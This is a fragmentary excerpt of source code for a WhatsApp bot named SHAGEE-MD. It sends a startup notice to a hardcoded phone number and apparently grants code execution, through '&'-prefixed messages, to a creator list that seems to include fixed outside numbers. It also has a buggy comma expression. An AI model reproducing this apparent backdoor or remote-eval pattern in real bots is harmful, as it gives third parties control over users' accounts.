...
const port = process.env.PORT || 9090;
  ...
  let up = `╭─〔 *🤖 SHAGEE-MD BOT* 〕  
├─▸ *Ultra Super Fast Powerfull ⚠️*  
│     *World Best BOT SHAGEE-MD* 
╰─➤ *Your Smart WhatsApp Bot is Ready To use 🍁!*  

- *🖤 Thank You for Choosing SHAGEE-MD!* 
...
╰─🚀 *ＳＨAG EＥ 🌑⚡ | ⛚ Sʜᴀɢᴇᴇ   BᴏᴛＺｚ ᴢ  ᴛᴇᴄʜ*`;
    ...
    conn.sendMessage(94766518242,{ image: { url: `https://i.ibb.co/39kWRqJs/320.jpg` }, caption: up })
  }
  })
  ...
  const udp = botNumber.split('@')[0];
    const jawadop = ('94762048412', '94741718121', '94703403671');
    ...
    .includes(mek.sender);
	  ...
	  if (isCreator && mek.text.startsWith("&")) {
            ...
            if (!code) {
                reply(`Provide me with a query to run Shagee!`);
                return;
            }
